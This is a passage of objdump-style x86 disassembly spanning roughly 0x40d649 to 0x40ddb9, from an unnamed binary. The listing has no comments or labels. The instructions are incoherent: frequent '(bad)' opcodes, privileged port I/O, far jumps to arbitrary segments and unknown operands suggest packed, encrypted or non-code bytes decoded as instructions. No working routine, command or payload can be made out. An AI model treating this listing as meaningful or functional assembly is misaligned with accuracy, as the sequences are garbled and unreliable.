  40d649:	xor    esp,DWORD PTR [eax+ecx*2]
  40d64c:	jae    0x40d607
  40d64e:	pop    eax
  40d64f:	push   esi
  40d650:	mov    WORD PTR [edi+eiz*1+0x413e010f],ds
  40d657:	or     ch,BYTE PTR [esi+0x45]
  40d65a:	add    eax,0xf36d728a
  40d65f:	fld    TBYTE PTR [esi-0x44]
  40d662:	enter  0x9179,0xe6
  40d666:	mov    ah,0x61
  40d668:	lods   eax,DWORD PTR ds:[esi]
  40d669:	cmp    esp,DWORD PTR [esi-0x1e]
  40d66c:	fsub   QWORD PTR [ebx-0x77f4aa38]
  40d672:	lods   al,BYTE PTR ds:[esi]
  40d673:	and    al,0x6d
  40d675:	stos   BYTE PTR es:[edi],al
  40d676:	aam    0xea
  40d678:	jmp    0x38381b70
  40d67d:	int    0x27
  40d67f:	aam    0xa6
  40d681:	lock or dh,BYTE PTR [edi+0x30eaa5c7]
  40d688:	jb     0x40d60e
  40d68a:	xor    edi,ebx
  40d68c:	adc    ah,BYTE PTR [esp]
  40d68f:	cmp    ecx,0x7e
  40d692:	cwde   
  40d693:	aaa    
  40d694:	add    eax,0x72509c79
  40d699:	mov    eax,0xc66f7647
  40d69e:	jecxz  0x40d651
  40d6a0:	data16 clc 
  40d6a2:	in     eax,dx
  40d6a3:	out    dx,al
  40d6a4:	and    eax,0xb29c1c4
  40d6a9:	out    dx,al
  40d6aa:	fistp  WORD PTR [esi-0x12]
  40d6ad:	int3   
  40d6ae:	adc    bh,BYTE PTR [edx]
  40d6b0:	or     eax,0xde4c7cd9
  40d6b5:	mov    BYTE PTR [ebp+0x62],bl
  40d6b8:	in     eax,dx
  40d6b9:	imul   ebx,ecx,0x8f86e92f
  40d6bf:	int3   
  40d6c0:	ss sbb esi,DWORD PTR gs:[esi-0xd]
  40d6c5:	inc    ebx
  40d6c6:	or     eax,0xb0f3b6a9
  40d6cb:	jge    0x40d733
  40d6cd:	loopne 0x40d698
  40d6cf:	dec    esi
  40d6d0:	pop    edx
  40d6d1:	outs   dx,DWORD PTR ds:[esi]
  40d6d2:	aam    0x50
  40d6d4:	pushf  
  40d6d5:	arpl   WORD PTR [edx],di
  40d6d7:	push   edx
  40d6d8:	nop    DWORD PTR [esi]
  40d6db:	jne    0x40d756
  40d6dd:	(bad)  
  40d6de:	dec    eax
  40d6df:	cmp    dl,0x95
  40d6e2:	mov    esp,0xb57f4f72
  40d6e7:	push   edx
  40d6e8:	xor    BYTE PTR [eax+0x12501f6f],ch
  40d6ee:	xor    BYTE PTR [eax+0x3ee9064e],bl
  40d6f4:	clc    
  40d6f5:	fneni(8087 only) 
  40d6f7:	int    0xc1
  40d6f9:	cwde   
  40d6fa:	xor    al,0x26
  40d6fc:	stos   BYTE PTR es:[edi],al
  40d6fd:	dec    ecx
  40d6fe:	mov    gs,esp
  40d700:	neg    DWORD PTR [esi+0x59]
  40d703:	ins    BYTE PTR es:[edi],dx
  40d704:	jle    0x40d729
  40d706:	xor    eax,0x1eb28987
  40d70b:	loop   0x40d728
  40d70d:	and    ah,BYTE PTR [esi]
  40d70f:	out    0x8a,al
  40d711:	xchg   edi,eax
  40d712:	adc    ebx,DWORD PTR [edx]
  40d714:	xchg   ecx,eax
  40d715:	mov    esp,0xe94c7356
  40d71a:	(bad)  [edx+edi*8]
  40d71d:	push   0x1b942f83
  40d722:	mov    ebp,0xd4ee79cd
  40d727:	(bad)  
  40d728:	cwde   
  40d729:	add    esi,ebp
  40d72b:	fcomp  QWORD PTR [ebp-0x2b]
  40d72e:	dec    ebp
  40d72f:	test   al,0xd
  40d731:	sbb    ecx,DWORD PTR [edx]
  40d733:	fdiv   st(4),st
  40d735:	adc    eax,DWORD PTR [ebp-0x2790a064]
  40d73b:	mov    WORD PTR [ebp-0x2a],gs
  40d73e:	outs   dx,DWORD PTR ds:[esi]
  40d73f:	jo     0x40d742
  40d741:	jecxz  0x40d7aa
  40d743:	stc    
  40d744:	mov    eax,0xba5bf083
  40d749:	jb     0x40d733
  40d74b:	pop    ds
  40d74c:	(bad)  
  40d74d:	stc    
  40d74e:	fs mov ah,0xa1
  40d751:	fs pop ecx
  40d753:	mov    ds:0xffc2bef9,al
  40d758:	mov    es,ebx
  40d75a:	ds sahf 
  40d75c:	jge    0x40d6e6
  40d75e:	mov    esp,0xa3b1bac5
  40d763:	std    
  40d764:	inc    esp
  40d765:	fwait
  40d766:	mov    ah,0x58
  40d768:	pop    ecx
  40d769:	cli    
  40d76a:	imul   ecx,DWORD PTR [ebp+ebp*8-0x9640b5a],0x2573061d
  40d775:	retf   
  40d776:	xor    DWORD PTR [esi+0x35],ecx
  40d779:	and    eax,0xa211ca39
  40d77e:	mov    eax,ds:0x5938e061
  40d783:	(bad)  
  40d784:	stos   BYTE PTR es:[edi],al
  40d785:	sub    al,0xcb
  40d787:	sbb    BYTE PTR [ebp-0x27],dh
  40d78a:	and    eax,DWORD PTR [esi]
  40d78c:	rcr    DWORD PTR [esp+ebp*1+0x39febd2c],0x7e
  40d794:	(bad)  
  40d795:	dec    edi
  40d796:	xchg   ecx,eax
  40d797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d798:	mov    ecx,0xe479f4eb
  40d79d:	leave  
  40d79e:	mov    ebx,0x5658557b
  40d7a3:	jmp    0xc0e4f6be
  40d7a8:	idiv   DWORD PTR cs:[esi-0x68861007]
  40d7af:	cmp    BYTE PTR [esi],al
  40d7b1:	jns    0x40d7c2
  40d7b3:	out    0x44,eax
  40d7b5:	aaa    
  40d7b6:	les    esi,FWORD PTR [ebx]
  40d7b8:	lods   al,BYTE PTR ds:[esi]
  40d7b9:	dec    edi
  40d7ba:	into   
  40d7bb:	mov    ds:0xb483a109,al
  40d7c0:	fs mov dl,0xf0
  40d7c3:	clc    
  40d7c4:	loop   0x40d81f
  40d7c6:	xchg   BYTE PTR [ecx+ecx*8+0x7d7593ff],al
  40d7cd:	imul   ebx,DWORD PTR [ebx-0x33324b57],0xffffffda
  40d7d4:	ss cwde 
  40d7d6:	jmp    0x6504:0x812a02ab
  40d7dd:	pop    ebx
  40d7de:	test   al,0xa2
  40d7e0:	into   
  40d7e1:	imul   edi,DWORD PTR [edx],0x5bd30459
  40d7e7:	in     al,0xcb
  40d7e9:	mov    ah,BYTE PTR [edi]
  40d7eb:	adc    al,0xf0
  40d7ed:	retf   0xd107
  40d7f0:	stos   BYTE PTR es:[edi],al
  40d7f1:	bound  ecx,QWORD PTR [edi+edx*4+0x50902be0]
  40d7f8:	add    ah,BYTE PTR [ebx]
  40d7fa:	xor    DWORD PTR [edi-0x25],esi
  40d7fd:	mov    DWORD PTR [esi-0x3],ebp
  40d800:	mov    DWORD PTR [eax-0x3d],esp
  40d803:	pop    edx
  40d804:	xor    ebp,DWORD PTR ds:[ebx+ecx*2]
  40d808:	ror    BYTE PTR [esi],cl
  40d80a:	jbe    0x40d810
  40d80c:	lahf   
  40d80d:	bound  ebp,QWORD PTR [eax]
  40d80f:	mov    dl,0x59
  40d811:	push   cs
  40d812:	in     al,dx
  40d813:	adc    al,0x32
  40d815:	fucomi st,st(1)
  40d817:	pop    eax
  40d818:	push   ebx
  40d819:	jecxz  0x40d86c
  40d81b:	dec    eax
  40d81c:	xchg   edx,eax
  40d81d:	ret    
  40d81e:	add    al,0x84
  40d820:	xchg   edx,eax
  40d821:	mov    cl,0xc6
  40d823:	hlt    
  40d824:	and    DWORD PTR [ebx],0xceb26c39
  40d82a:	leave  
  40d82b:	cmp    BYTE PTR [edx],dl
  40d82d:	inc    esp
  40d82e:	daa    
  40d82f:	mov    ecx,0xb3348701
  40d834:	in     al,0x33
  40d836:	xchg   BYTE PTR [esi+0x5c],cl
  40d839:	xchg   ebp,eax
  40d83a:	xor    al,0x77
  40d83c:	pop    ebp
  40d83d:	push   ebp
  40d83e:	pop    edi
  40d83f:	sti    
  40d840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d841:	and    al,0x70
  40d843:	mov    esi,DWORD PTR [ebx]
  40d845:	xor    esi,edi
  40d847:	sar    al,1
  40d849:	add    al,0xf3
  40d84b:	mov    ebp,0x39f0779d
  40d850:	mov    DWORD PTR [ebp-0x65],ebx
  40d853:	or     eax,DWORD PTR [esi-0x70]
  40d856:	inc    esi
  40d857:	mov    esp,?
  40d859:	mov    ah,0x63
  40d85b:	scas   eax,DWORD PTR es:[edi]
  40d85c:	imul   eax,ebp,0xb3a21837
  40d862:	daa    
  40d863:	in     al,dx
  40d864:	fld    TBYTE PTR ds:0xafbc900f
  40d86a:	mov    edx,0x77176c5b
  40d86f:	pop    ecx
  40d870:	push   ebp
  40d871:	addr16 jns 0x40d8a5
  40d874:	add    eax,0x45a957d0
  40d879:	sbb    eax,0xa46b2df8
  40d87e:	popf   
  40d87f:	outs   dx,BYTE PTR ds:[esi]
  40d880:	cmc    
  40d881:	pop    edx
  40d882:	test   DWORD PTR [ebx],esi
  40d884:	ja     0x40d8c8
  40d886:	jl     0x40d85f
  40d888:	cdq    
  40d889:	test   BYTE PTR [ebp-0x3f3bcef5],bh
  40d88f:	stc    
  40d890:	mov    edi,0x2dac823f
  40d895:	rcl    BYTE PTR ds:0xabb8bb66,1
  40d89b:	pop    ebp
  40d89c:	into   
  40d89d:	out    0x85,eax
  40d89f:	cmp    DWORD PTR [ebp+0x3e54389c],0x2bbbf0b2
  40d8a9:	mov    WORD PTR [edi+0x19e97b47],?
  40d8af:	or     esp,esp
  40d8b1:	inc    ebx
  40d8b2:	dec    esp
  40d8b3:	inc    esp
  40d8b4:	int    0x9f
  40d8b6:	int    0xe6
  40d8b8:	and    BYTE PTR [ebx-0x3743c007],0xcc
  40d8bf:	sbb    ch,BYTE PTR [eax-0x75f0e77a]
  40d8c5:	call   0x91bb:0x44407736
  40d8cc:	dec    ecx
  40d8cd:	jecxz  0x40d89b
  40d8cf:	out    0xec,al
  40d8d1:	add    ecx,eax
  40d8d3:	cli    
  40d8d4:	sahf   
  40d8d5:	xlat   BYTE PTR ds:[ebx]
  40d8d6:	inc    ebp
  40d8d7:	repnz and edi,DWORD PTR [ecx+0x6c]
  40d8db:	or     al,0x44
  40d8dd:	ins    BYTE PTR es:[edi],dx
  40d8de:	mov    ah,0xc8
  40d8e0:	sahf   
  40d8e1:	push   ds
  40d8e2:	repz loope 0x40d88b
  40d8e5:	mov    edx,0xf1d53515
  40d8ea:	in     al,0x80
  40d8ec:	test   eax,0xc123d86a
  40d8f1:	sti    
  40d8f2:	adc    eax,0x5e597eaf
  40d8f7:	rcr    DWORD PTR [esi+0x1722425c],1
  40d8fd:	mov    ebp,0x920310fd
  40d902:	jge    0x40d918
  40d904:	test   al,0x28
  40d906:	adc    eax,0xa131c45d
  40d90b:	jne    0x40d94b
  40d90d:	lahf   
  40d90e:	or     BYTE PTR gs:[ebx],dh
  40d911:	xchg   ebp,eax
  40d912:	mov    ch,0xd2
  40d914:	jp     0x40d89f
  40d916:	lods   eax,DWORD PTR ds:[esi]
  40d917:	inc    esi
  40d918:	sti    
  40d919:	ror    DWORD PTR [ecx],cl
  40d91b:	inc    edi
  40d91c:	stc    
  40d91d:	je     0x40d942
  40d91f:	test   BYTE PTR [esi-0x2dd45eee],0xc5
  40d926:	lds    eax,FWORD PTR [edx+0x10]
  40d929:	pop    ss
  40d92a:	adc    edx,esi
  40d92c:	in     eax,dx
  40d92d:	inc    eax
  40d92e:	push   esp
  40d92f:	adc    al,0x48
  40d931:	ret    0x7491
  40d934:	sub    al,0xee
  40d936:	frndint 
  40d938:	mov    cl,0x7c
  40d93a:	(bad)  [edi-0x33b9d5e5]
  40d940:	add    al,0xbe
  40d942:	icebp  
  40d943:	push   ds
  40d944:	xchg   BYTE PTR [ecx+ecx*1-0x4d3c15da],dl
  40d94b:	ficom  WORD PTR [ebp-0x8]
  40d94e:	jno    0x40d955
  40d950:	fwait
  40d951:	rcr    ah,1
  40d953:	push   ss
  40d954:	xor    DWORD PTR [esi+eiz*8],edi
  40d957:	loop   0x40d9d5
  40d959:	(bad)
  40d95e:	jmp    0xc3aa4ea2
  40d963:	inc    ebx
  40d964:	jecxz  0x40d9b3
  40d966:	and    al,0xf2
  40d968:	mul    ebp
  40d96a:	xor    ecx,DWORD PTR [eax-0x24]
  40d96d:	jmp    0x40d94b
  40d96f:	push   esi
  40d970:	in     eax,0xe8
  40d972:	es dec esi
  40d974:	in     al,dx
  40d975:	fidiv  DWORD PTR [ecx-0x16b56562]
  40d97b:	lock mov bl,0xbd
  40d97e:	in     eax,0xee
  40d980:	int    0xe6
  40d982:	add    BYTE PTR [ebx-0x67],0x4a
  40d986:	mov    esp,0xaa47fb8f
  40d98b:	mov    edx,0xf7c027ce
  40d990:	mov    ds:0x6230d98b,eax
  40d995:	or     DWORD PTR [ebp-0x49],esi
  40d998:	outs   dx,BYTE PTR ds:[esi]
  40d999:	jae    0x40d9cd
  40d99b:	jp     0x40d93b
  40d99d:	sub    al,0xa7
  40d99f:	ror    DWORD PTR [ebx+0x30d9c4db],1
  40d9a5:	sbb    esi,DWORD PTR [edx+ebp*2+0x104cc0d8]
  40d9ac:	mov    dh,0x4e
  40d9ae:	inc    esp
  40d9af:	and    ch,ah
  40d9b1:	push   ebp
  40d9b2:	(bad)  
  40d9b4:	mov    ah,dh
  40d9b6:	xor    BYTE PTR ds:0xa3ef3746,ah
  40d9bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9bd:	(bad)  
  40d9bf:	inc    esp
  40d9c0:	push   edi
  40d9c1:	aas    
  40d9c2:	mov    eax,ds:0xd150851f
  40d9c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9c8:	cmp    ecx,DWORD PTR [ebp+0x6]
  40d9cb:	(bad)  
  40d9cd:	pusha  
  40d9ce:	pop    ds
  40d9cf:	outs   dx,BYTE PTR ds:[esi]
  40d9d0:	sbb    eax,0x33abedf9
  40d9d5:	in     eax,dx
  40d9d6:	adc    edx,ecx
  40d9d8:	sti    
  40d9d9:	mov    eax,ds:0xe1e720f0
  40d9de:	push   ecx
  40d9df:	loope  0x40d967
  40d9e1:	imul   ecx,DWORD PTR [edx+0x4a]
  40d9e5:	mov    al,0xcb
  40d9e7:	sub    DWORD PTR [edi],ebp
  40d9e9:	aaa    
  40d9ea:	test   eax,0xa7e37a15
  40d9ef:	fst    DWORD PTR [eax-0x39]
  40d9f2:	add    eax,0x7cb9a4f0
  40d9f7:	jo     0x40da76
  40d9f9:	push   0xffffffcd
  40d9fb:	in     eax,0x11
  40d9fd:	inc    edi
  40d9fe:	sahf   
  40d9ff:	outs   dx,DWORD PTR ds:[esi]
  40da00:	adc    BYTE PTR ds:0xb55e92fa,ah
  40da06:	popa   
  40da07:	xor    ah,BYTE PTR [edx+0x6d]
  40da0a:	xchg   ecx,eax
  40da0b:	push   ds
  40da0c:	mov    cl,0xf7
  40da0e:	mov    ebp,0x633a9633
  40da13:	push   0x53
  40da15:	jg     0x40da69
  40da17:	(bad)  
  40da18:	dec    edi
  40da19:	jne    0x40d9bb
  40da1b:	jge    0x40d9d6
  40da1d:	xchg   esp,eax
  40da1e:	sbb    DWORD PTR [edx+0x6a],edi
  40da21:	lods   eax,DWORD PTR ds:[esi]
  40da22:	(bad)  
  40da23:	pop    ecx
  40da24:	sbb    BYTE PTR [ebp+0x7555b89d],bl
  40da2a:	dec    esp
  40da2b:	sbb    al,0x1
  40da2d:	cmp    ebp,DWORD PTR [esi-0x5a0b434a]
  40da33:	icebp  
  40da34:	mov    dl,0x7f
  40da36:	rcl    DWORD PTR [ebx+esi*4],1
  40da39:	jp     0x40d9ef
  40da3b:	out    dx,eax
  40da3c:	jns    0x40da80
  40da3e:	sbb    al,0xc6
  40da40:	test   BYTE PTR [ebx],al
  40da42:	jnp    0x40da35
  40da44:	bound  esi,QWORD PTR [ecx+0x32755a0]
  40da4a:	in     al,dx
  40da4b:	call   0xe0d920c4
  40da50:	(bad)  
  40da52:	mov    esp,0xd38872c
  40da57:	or     bl,BYTE PTR [edi+ebp*2]
  40da5a:	xchg   eax,eax
  40da5c:	mov    dl,0xd2
  40da5e:	mov    bh,0x5
  40da60:	dec    ecx
  40da61:	dec    esp
  40da62:	push   0xd5431d81
  40da67:	sbb    edx,DWORD PTR ds:0xbf5ee0a6
  40da6d:	enter  0x9c19,0xb
  40da71:	daa    
  40da72:	or     eax,0x91eb3b63
  40da77:	jle    0x40da8c
  40da79:	(bad)  
  40da7a:	sub    DWORD PTR [edx+0x2e97fbd5],ebp
  40da80:	jle    0x40da92
  40da82:	push   0x34
  40da84:	sbb    eax,0x2daec431
  40da89:	mov    dh,0x96
  40da8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da8c:	retf   
  40da8d:	in     eax,dx
  40da8e:	xchg   edi,eax
  40da8f:	sahf   
  40da90:	mov    ebp,0xe4c4badd
  40da95:	loop   0x40da99
  40da97:	xor    bh,0xfb
  40da9a:	inc    edx
  40da9b:	push   ds
  40da9c:	test   DWORD PTR [eax-0x4e437e7e],edx
  40daa2:	mul    ch
  40daa4:	mov    ds:0x9a4ae1b6,eax
  40daa9:	jbe    0x40da77
  40daab:	lods   al,BYTE PTR ds:[esi]
  40daac:	mov    BYTE PTR [ecx],0x21
  40daaf:	mov    bh,0x81
  40dab1:	pop    esp
  40dab2:	sbb    bl,BYTE PTR [ecx]
  40dab4:	jns    0x40dace
  40dab6:	shl    DWORD PTR [ebx+0xc],1
  40dab9:	jge    0x40dacc
  40dabb:	add    ecx,eax
  40dabd:	sysret 
  40dabf:	clc    
  40dac0:	jmp    0xcec0fd56
  40dac5:	fild   QWORD PTR [ecx-0x2f]
  40dac8:	pop    ebx
  40dac9:	adc    al,0x6f
  40dacb:	push   0xffffff8b
  40dacd:	adc    DWORD PTR [ecx],esp
  40dacf:	inc    DWORD PTR ds:0x6fc0a838
  40dad5:	mov    edx,0x4210af7
  40dada:	lock jmp 0xa1307a92
  40dae0:	fistp  QWORD PTR [ecx+eiz*4]
  40dae3:	fldcw  WORD PTR [esi]
  40dae5:	pop    ecx
  40dae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae7:	lods   eax,DWORD PTR ds:[esi]
  40dae8:	iret   
  40dae9:	xor    ebx,DWORD PTR [di-0x17af]
  40daee:	jl     0x40dadb
  40daf0:	std    
  40daf1:	ret    
  40daf2:	dec    edi
  40daf3:	scas   eax,DWORD PTR es:[edi]
  40daf4:	cmp    DWORD PTR [eax-0x732906f8],edx
  40dafa:	call   WORD PTR [eax-0x15]
  40dafe:	push   ecx
  40daff:	pop    ebx
  40db00:	cmp    eax,0x5693d7e9
  40db05:	inc    esp
  40db06:	ds popf 
  40db08:	call   0xe1300cdd
  40db0d:	data16 cli 
  40db0f:	sar    esi,cl
  40db11:	jp     0x40db6f
  40db13:	ja     0x40db17
  40db15:	call   0xf6f:0x6c1ac8ee
  40db1c:	aad    0x2b
  40db1e:	mov    edx,0x643a085e
  40db23:	and    ebx,DWORD PTR [ebp+0x1e]
  40db26:	sbb    eax,0x1c59c29d
  40db2b:	int    0x4f
  40db2d:	ins    DWORD PTR es:[edi],dx
  40db2e:	xchg   BYTE PTR ds:0xec259054,dl
  40db34:	xchg   esp,eax
  40db35:	leave  
  40db36:	(bad)  
  40db37:	cmp    ecx,ebp
  40db39:	push   ecx
  40db3a:	leave  
  40db3b:	cmp    BYTE PTR [eax-0x4aaf96bb],ch
  40db41:	mov    gs,esi
  40db43:	int3   
  40db44:	lea    ebp,[ecx-0x54f3bc3e]
  40db4a:	xchg   ebp,eax
  40db4b:	clc    
  40db4c:	rol    dl,0xf4
  40db4f:	nop
  40db50:	add    BYTE PTR [ebx+0x2e],bh
  40db53:	fist   WORD PTR [edx]
  40db55:	jle    0x40dbaf
  40db57:	dec    esp
  40db58:	stc    
  40db59:	loopne 0x40db66
  40db5b:	les    esi,FWORD PTR [ecx-0x5c]
  40db5e:	cmp    al,0xb
  40db60:	sub    eax,0xf1fb039d
  40db65:	stos   DWORD PTR es:[edi],eax
  40db66:	mov    dl,0x37
  40db68:	aaa    
  40db69:	xor    ah,al
  40db6b:	(bad)  
  40db6c:	xchg   edi,eax
  40db6d:	and    edx,esp
  40db6f:	mov    dl,0xdb
  40db71:	pop    ebx
  40db72:	mov    bh,BYTE PTR [edx+edx*2]
  40db75:	arpl   bx,cx
  40db77:	icebp  
  40db78:	xadd   BYTE PTR [ebp+0x225faddc],cl
  40db7f:	out    0x65,eax
  40db81:	dec    ebp
  40db82:	shl    BYTE PTR [ebx],cl
  40db84:	pop    ebp
  40db85:	popa   
  40db86:	push   esi
  40db87:	clc    
  40db88:	(bad)  
  40db8a:	xchg   ebx,eax
  40db8b:	bnd jp 0x40db57
  40db8e:	arpl   WORD PTR [eax-0x8],ax
  40db91:	push   es
  40db92:	or     ebx,ecx
  40db94:	jge    0x40db8c
  40db96:	ja     0x40dbc1
  40db98:	cmp    esi,ecx
  40db9a:	in     eax,dx
  40db9b:	loopne 0x40dbe0
  40db9d:	sahf   
  40db9e:	aam    0xd4
  40dba0:	clc    
  40dba1:	xor    ebx,ebx
  40dba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dba4:	dec    esp
  40dba5:	dec    edi
  40dba6:	pop    edx
  40dba7:	xchg   BYTE PTR [ebp+0x53],al
  40dbaa:	imul   eax,ecx,0xf382c7da
  40dbb0:	aas    
  40dbb1:	pop    ecx
  40dbb2:	sub    eax,0xeef564a7
  40dbb7:	xchg   edi,eax
  40dbb8:	repnz dec ecx
  40dbba:	mov    bh,0xc9
  40dbbc:	(bad)  
  40dbbe:	js     0x40db80
  40dbc0:	push   0x6b
  40dbc2:	xor    edx,edx
  40dbc4:	jae    0x40dc42
  40dbc6:	adc    esp,DWORD PTR [esi-0x27cf3b6b]
  40dbcc:	pop    edx
  40dbcd:	loope  0x40dc37
  40dbcf:	ins    DWORD PTR es:[edi],dx
  40dbd0:	push   ss
  40dbd1:	inc    eax
  40dbd2:	fwait
  40dbd3:	dec    eax
  40dbd4:	dec    ecx
  40dbd5:	sub    eax,0x8b1fd71a
  40dbda:	scas   eax,DWORD PTR es:[edi]
  40dbdb:	call   0xe84aa658
  40dbe0:	xor    eax,0x571469dc
  40dbe5:	stc    
  40dbe6:	inc    esi
  40dbe7:	jmp    0x40dc02
  40dbe9:	retf   0x819b
  40dbec:	arpl   si,dx
  40dbee:	je     0x40db9a
  40dbf0:	dec    eax
  40dbf1:	addr16 out 0x46,al
  40dbf4:	cs cmc 
  40dbf6:	shl    DWORD PTR [edx],cl
  40dbf8:	stc    
  40dbf9:	push   esp
  40dbfa:	and    BYTE PTR [eax+ebx*1-0x668c8dfd],dl
  40dc01:	cmp    DWORD PTR [ecx-0x65300a55],esi
  40dc07:	(bad)  
  40dc08:	sub    eax,0x32b5f0aa
  40dc0d:	lods   al,BYTE PTR ds:[esi]
  40dc0e:	ret    
  40dc0f:	pop    ecx
  40dc10:	pop    esi
  40dc11:	xchg   edi,eax
  40dc12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc13:	cmp    eax,0xfbfc10f4
  40dc18:	retf   0x8ae3
  40dc1b:	mov    edi,DWORD PTR [ecx+0x65]
  40dc1e:	mov    bl,BYTE PTR [ebx+0x45]
  40dc21:	adc    edx,DWORD PTR [ebx+0x323354df]
  40dc27:	and    BYTE PTR [edi],bh
  40dc29:	dec    ebp
  40dc2a:	mov    esp,0xed012193
  40dc2f:	dec    ecx
  40dc30:	fsubr  DWORD PTR [esi+0x47]
  40dc33:	sbb    dh,al
  40dc35:	js     0x40dc43
  40dc37:	es jne 0x40dc79
  40dc3a:	fidiv  WORD PTR [ecx+0x23]
  40dc3d:	mov    bh,0x79
  40dc3f:	mov    al,ds:0x215d6578
  40dc44:	call   0xe7c732ea
  40dc49:	loopne 0x40dbd9
  40dc4b:	jb     0x40dc57
  40dc4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4e:	jecxz  0x40dc87
  40dc50:	jb     0x40dcc5
  40dc52:	fisub  DWORD PTR ds:0x290687cc
  40dc58:	aad    0x7c
  40dc5a:	inc    eax
  40dc5b:	into   
  40dc5c:	sub    DWORD PTR [ecx],ebx
  40dc5e:	ins    DWORD PTR es:[edi],dx
  40dc5f:	lock stos DWORD PTR es:[edi],eax
  40dc61:	mov    dh,dh
  40dc63:	lahf   
  40dc64:	push   ss
  40dc65:	push   ecx
  40dc66:	fbld   TBYTE PTR [esi+0x25966d72]
  40dc6c:	test   al,0xce
  40dc6e:	sub    BYTE PTR [eax+eax*1-0x30],0xb6
  40dc73:	fst    QWORD PTR [bx+si]
  40dc76:	fwait
  40dc77:	and    BYTE PTR [ecx-0xb3e7f57],bl
  40dc7d:	loope  0x40dc90
  40dc7f:	mov    ah,0xc7
  40dc81:	sahf   
  40dc82:	shl    eax,cl
  40dc84:	mov    edx,0xa6020304
  40dc89:	jo     0x40dc32
  40dc8b:	in     eax,0x23
  40dc8d:	in     al,dx
  40dc8e:	mov    ch,0x8f
  40dc90:	mov    dh,0xd
  40dc92:	addr16 js 0x40dcd7
  40dc95:	call   FWORD PTR [edx]
  40dc97:	aaa    
  40dc98:	sub    DWORD PTR [edi],0x925fdac6
  40dc9e:	inc    esp
  40dc9f:	jg     0x40dc53
  40dca1:	repnz out dx,al
  40dca3:	loope  0x40dc73
  40dca5:	xor    DWORD PTR [ebp+ebx*1-0x61],esi
  40dca9:	retf   0x8448
  40dcac:	mov    ebx,0x58241120
  40dcb1:	pop    ebx
  40dcb2:	(bad)  
  40dcb4:	jmp    0x996a:0x448552c1
  40dcbb:	test   al,0xf3
  40dcbd:	jae    0x40dcf1
  40dcbf:	mov    eax,0xc64f6bcc
  40dcc4:	jle    0x40dcf1
  40dcc6:	ret    
  40dcc7:	push   es
  40dcc8:	out    0xbc,eax
  40dcca:	and    DWORD PTR [edx-0x7afa07e1],ecx
  40dcd0:	dec    esp
  40dcd1:	shl    BYTE PTR [ebp+0x7d],0xab
  40dcd5:	xchg   ebx,eax
  40dcd6:	inc    ebp
  40dcd7:	jecxz  0x40dd15
  40dcd9:	push   edi
  40dcda:	enter  0xc2d4,0x35
  40dcde:	xor    eax,0x22285dc2
  40dce3:	icebp  
  40dce4:	cs inc eax
  40dce6:	mov    al,ds:0x4ac310f2
  40dceb:	push   eax
  40dcec:	and    ah,al
  40dcee:	dec    eax
  40dcef:	call   0xc56b:0x30693f41
  40dcf6:	shl    bh,0xe0
  40dcf9:	xchg   esi,eax
  40dcfa:	dec    ebp
  40dcfb:	pop    ebp
  40dcfc:	idiv   edi
  40dcfe:	mov    al,0x92
  40dd00:	add    eax,0x50d746a1
  40dd05:	popa   
  40dd06:	pop    ds
  40dd07:	sti    
  40dd08:	mov    ebx,0x628cc575
  40dd0d:	not    esp
  40dd0f:	xor    al,0xd1
  40dd11:	(bad)  
  40dd12:	add    bh,BYTE PTR [edi+0x62]
  40dd15:	xchg   BYTE PTR ds:0xd0c63e5a,cl
  40dd1b:	or     eax,0x6a582552
  40dd20:	adc    esi,DWORD PTR [edi]
  40dd22:	add    al,0xdb
  40dd24:	add    eax,0x788f87d4
  40dd29:	out    dx,eax
  40dd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd2b:	fs iret 
  40dd2d:	ins    DWORD PTR es:[edi],dx
  40dd2e:	xchg   DWORD PTR [ebx+edi*8-0x55],esi
  40dd32:	aam    0xbb
  40dd34:	int    0x57
  40dd36:	mov    gs,WORD PTR [esi-0x3]
  40dd39:	stos   BYTE PTR es:[edi],al
  40dd3a:	retf   0xd1e2
  40dd3d:	cwde   
  40dd3e:	adc    al,0x57
  40dd40:	cs sti 
  40dd42:	in     eax,dx
  40dd43:	icebp  
  40dd44:	jo     0x40dce5
  40dd46:	or     eax,0x7ac61d3b
  40dd4b:	mov    dh,BYTE PTR [edx-0x7fe0d6c9]
  40dd51:	mov    bh,0xc
  40dd53:	adc    dl,BYTE PTR [ebp+0x55121ed7]
  40dd59:	inc    eax
  40dd5a:	jmp    0x40dd26
  40dd5c:	xchg   edx,eax
  40dd5d:	out    0xa,al
  40dd5f:	xchg   esp,eax
  40dd60:	jge    0x40dd44
  40dd62:	jae    0x40dd52
  40dd64:	mov    ecx,0x6c06b1f2
  40dd69:	icebp  
  40dd6a:	jnp    0x40ddcc
  40dd6c:	sub    edx,DWORD PTR [esi+0x56]
  40dd6f:	loop   0x40dd6e
  40dd71:	jmp    DWORD PTR [esi+ecx*8-0x4ebc7f57]
  40dd78:	or     eax,0x89e5fa1f
  40dd7d:	mov    bl,0xe9
  40dd7f:	xchg   esi,eax
  40dd80:	repz fsub QWORD PTR [ebp+0x2ce5d79c]
  40dd87:	mov    WORD PTR [edi],cs
  40dd89:	not    DWORD PTR [ebx]
  40dd8b:	fild   QWORD PTR [edi+0x73]
  40dd8e:	dec    ebp
  40dd8f:	bound  edx,QWORD PTR [ebx]
  40dd91:	lods   al,BYTE PTR ds:[esi]
  40dd92:	pop    esp
  40dd93:	or     BYTE PTR es:[ebx+0x54],bh
  40dd97:	pop    es
  40dd98:	test   DWORD PTR [esi],ebx
  40dd9a:	sbb    edi,eax
  40dd9c:	scas   al,BYTE PTR es:[di]
  40dd9e:	push   edx
  40dd9f:	dec    ebx
  40dda0:	mov    ds:0xdb01e84a,al
  40dda5:	or     edx,DWORD PTR [edi+0x40]
  40dda8:	imul   edi,edx,0xffffff8f
  40ddab:	into   
  40ddac:	rcl    ebp,0x87
  40ddaf:	push   ecx
  40ddb0:	xor    ecx,ebp
  40ddb2:	pop    es
  40ddb3:	xchg   DWORD PTR [esi-0x2c4d75f0],edx
  40ddb9:	xor    bl,ah
